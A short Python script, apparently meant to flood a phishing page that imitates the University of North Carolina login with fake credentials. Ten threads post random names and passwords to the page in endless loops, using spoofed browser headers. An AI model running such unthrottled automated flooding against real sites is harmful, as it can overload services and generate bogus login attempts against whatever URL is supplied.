import requests
import random
from fake_headers import Headers
import names
import threading

count = 1

def hehe():
    while True:
        n = names.get_first_name() + '@ad.unc.edu'
        p = ''.join(random.sample('1234567890qwertyuiopasdfghjklzxcvbnm!@#$%^&*()', 10))
        header = Headers(headers=False)
        data = {
            'UserName': n,
            'Password': p,
            'AuthMethod': 'FormsAuthentication'
        }
        with requests.post('https://fexerj.org.br/1/federate.ad.unc.edu/login.php', data, headers=header.generate()) as f:
            pass
        global count
        print(count)
        count += 1

if __name__ == '__main__':
    for i in range(10):
        t = threading.Thread(target=hehe)
        t.start()
        print("finish")